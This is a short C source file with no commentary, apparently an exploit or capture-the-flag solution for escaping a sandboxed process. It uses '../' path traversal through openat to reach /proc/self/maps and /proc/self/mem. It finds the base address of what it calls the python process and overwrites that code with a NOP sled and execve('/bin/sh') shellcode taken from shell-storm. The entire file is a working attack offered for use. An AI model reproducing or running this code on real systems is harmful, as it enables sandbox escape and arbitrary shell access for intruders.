#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <stdint.h>
#include <string.h>

char buffer[0x1000];

uint64_t get_base_address()
{
    uint64_t base;
    DIR *dir = opendir("/");
    int fd = openat(dirfd(dir), "../../../../../proc/self/maps", O_RDONLY);
    
    if (fd < 0) {
        puts("Fail Opening");
        exit(0);
    }

    read(fd, buffer, sizeof(buffer));
    puts(buffer);
    char *start = buffer;
    start = strchr(start, '\n');
    start++;

    char *end = start;
    end = strchr(end, '-');
    *end = '\0';

    base = strtoul(start, NULL, 0x10);

    return base;

}

// http://shell-storm.org/shellcode/files/shellcode-806.php
char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main(int argc, char* argv[])
{
    uint64_t base = get_base_address();
    printf("python @ 0x%lx\n", base);
    
    DIR *dir = opendir("/");
    int fd = openat(dirfd(dir), "../../../../../proc/self/mem", O_RDWR);
    
    if (fd < 0) {
        puts("Fail Opening");
        exit(0);
    }

    memset(buffer, 0x90, sizeof(buffer));
    memcpy(buffer+sizeof(buffer)-sizeof(shellcode), shellcode, sizeof(shellcode));

    lseek(fd, base, SEEK_SET);

    write(fd, buffer, sizeof(buffer));
    close(fd);
}
